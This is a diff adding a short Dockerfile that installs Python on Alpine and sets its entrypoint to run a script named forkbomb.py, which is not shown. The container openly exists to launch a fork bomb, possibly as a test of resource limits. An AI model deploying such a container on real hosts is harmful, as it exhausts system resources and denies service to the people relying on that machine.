@@ -1,0 +1,6 @@
+FROM alpine
+WORKDIR /
+COPY . .
+RUN apk update
+RUN apk add python3
+ENTRYPOINT ["python3", "/forkbomb.py"]
